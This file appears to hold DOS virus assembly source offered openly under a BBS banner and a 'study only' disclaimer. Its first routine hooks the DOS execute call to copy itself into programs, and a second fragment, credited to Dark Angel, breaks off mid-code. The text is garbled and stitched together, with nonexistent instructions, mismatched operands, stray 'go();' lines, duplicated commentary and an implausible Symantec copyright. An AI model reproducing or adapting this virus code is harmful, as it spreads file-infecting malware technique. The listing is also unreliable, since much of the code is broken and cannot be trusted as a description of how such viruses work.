;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is only for the Purpose of Virus Study and Education. It Should  ;
; not be Passed into General Circulation. It Will be Very Useful for People ;
; Who are Interested in How Viruses Work and Behave. However, If Letted, it  ;
; COULD be Used to Infect Computers with Virus. This is One of Many Virus    ;
; Examples Provided by the MalwareEducation Institute's Research Department;
; You are Secondly Asked Not to Pass this On, but if you Do and Cause       ;
; Damage to anyone please answer to the Laws on Computer Misuse and be Sent   ;
; to Court!                                                                  ;
;                                                                            ;
;                                                                            ;
;***************************************************************************;

	.model tiny
	.code
	org     100h

start_virus:

	jmp     virus_start

normal_code_end_eighth:

	db      8 dup (90h)

virus_signature           db 'MnRaF'

saved_begin_normal_code   db      3 dup(0)
return_to_main            dw      offset return_to_main_end - 100h
main_loop_counter         dw      0

virus_start:

	call    $+3
	int_21_location     dw  5555h
	virussize             dw      offset virus_end - start_virus

return_1:

	pop     si
	mov     ax,si

	dw      ?
check_presence:

	cmp     cs:int_21_location,5555h
	je      already_here

	push    ax

	mov     di,ax
	mov     cx,virussize
	xor     dx,dx                   ; First, get a random number.
	int     1Ah                     ; Then put it in DX.

again:
	inc     si
	loop    again

pop_ax:

	pop     bx
	mov     es,bx
	sub     si,di
	jnc     pop_si
	pop     si
pop_si:

	pop     si
	xchg    dx,cx
	rep     movsb
	xchg    dx,cx

	push    ds
	push    cs
	pop     ds
	push    cs
	pop     es

	mov     bx,es
	add     bx,10h
	jc      no_entry_clear
	cld

	mov     di,offset int_21_handler
	lea     si,[bx+offset int_21_location]
	movsw
	movsw

	mov     word ptr b:[si-6],offset int_21 - 100h
no_entry_clear:
	clc
ret_from_check:
	ret

already_here:
	cmp     byte ptr cs:saved_begin_normal_code[3],0BBh
	je      restore_com
	jmp     activate

restore_com:

	push    cs
	pop     ds
	xor     bx,bx
	mov     si,offset saved_begin_normal_code
	mov     di,100h
	movsw
	movsbsi
	pop     es
	movsw
	pop     ds
	movsdi100

	return_to_main_end:

	push    cs
	pop     es
	xor     cx,cx
	mov     dx,offset int_21_handler
	mov     ax,2521H
	int     21h
	pop     ax
	retn

int_21_handler:

	cmp     ah,11h                ; Function 11h = Get Random Number.
	jne     real_int_21
	retn  2

real_int_21:
	cmp     ah,4Bh                ; Function 4Bh = Execute Program.
	je      infect                 ; equal? jump to infect
	jmp     check_presence        ; jump to check_presence

infect:
	push    bp                      ; Save BP
	mov     bp,sp                   ; BP points to parameters
	sub     sp,12h                  ; Allocate local data

	mov     ax,9E03h                ; AX = function & mask
	cwd                             ; CX = counter / divider (dividend)
	div     ax                      ; Divide AX (CS:DX) by CX
	or      dx,dx                   ; Check if there is a remainder
	jz      done_infected           ; Branch if no infection (zero)

	pushf                           ; Push flags onto stack
	call    dword ptr cs:[bp+8]     ; Call DOS (execute program)

	mov     cs:main_loop_counter,dx ; Store main loop counter

	popf                            ; Pop flags off stack
	iret                            ; Interrupt return back to DOS

done_infected:
	mov     sp,bp                   ; SP points to old BP
	pop     bp                      ; Restore BP from stack


activate:

	mov     si,offset print_it
	xor     dl,dl
global_print_loop:
	mov     ah,2
	int     21h

	add     si,4
	cmp     byte ptr cs:[si-4],'A'
	jge     global_print_loop
	ret

print_it db '(C)1993 PHALCON/SKISM',10,13
	db 'Vaporizing One Strain At A Time.',10,13
	db '$'

prog_size     dw      offset virus_end - new_program

return_to_main_end_offset_old:

	push    cs
	pop     es
	mov     di,100h
	lea     si,[bx+offset normal_code]
	movsb
	movsbsi
	pop     ds
	movsw

	mov     bx,dx
	jc      no_entry
	cld
	mov     di,offset entry_point
	lea     si,[bx+offset int_21_handler]
	movsw
	movsw

	mov     ah,51h
	int     21h

	push    es
	pop     ds
	xor     bx,bx
	mov     es,bx

	no_entry:
	ret



new_program     db      0CDh, 20h, 0, 0

entry_point:

	ret

saved_begin_normal_code   db      3 dup(0)

virus_end:

	end     start_virus

;) 
end; 
go();
;*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*
*  PLEASE DO NOT DISTRIBUTE!                                              *
*  (c) 1994 by THE SYMANTEC COMPANY                                       *
*                                                                          *
*    The above copyright notice and this line of text must stay            *
*    intact through out all copies as well as modifications had they      *
*    any been made to this file.                                           *
*- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*

;  c:com

```
The code above appears to be a viral source code sample. The text within ";" 
repeats throughout the code and may serve as a disassembler overlay or some 
other purpose that I do not know.
``` 

;  c:com

```
The code above appears to be a viral source code sample. The text within ";" 
repeats throughout the code and may serve as a disassembler overlay or some 
other purpose that I do not know.
``` 

;------------------------------------------------------------------------------;
;                                                                              ;
;                       Mindless No Brained Reins                              ;
;                       --------------------------------                           ;
;                       "Weveled Around In The Wire"                         ;
;                       Ver 1.00                                               ;
;                                                                              ;
;                                 ****                           by              ;
;                                                                              ;
;                       Dark Angel                                             ;
;                                                                              ;
;------------------------------------------------------------------------------;

	.model	tiny
	.radix	16
	.code

	ORG	100h

START:
	jmp	MAIN_POINT
	nop
	dw	0
	dw	0
	dw	0

;::::::::::::::::::
;	ANOTHER VIRUS!
;:::::::::::::::::

DB	0E9, 02, 01, 90, 90

;::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;								          :
;	              REMOVE THE JMP			     	  :
;								          :
;::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

MAIN_POINT:
	cli
	mov	si,OFFSET OLD_HOST_CODE
	cld
	mov	al,BYTE PTR CS:[SI]
	mov	bx,AX
	mov	al,BYTE PTR [SI][3]
	mov	ch,AX
	mov	ax,0100
	mov	dx,AX
	mov	al,BYTE PTR [SI][2]
	mov	ah,AX
	mov	al,BYTE PTR [SI][1]
	mov	bl,AX
	sti
	mov	si,OFFSET ORG_BHCOD
	mov	di,01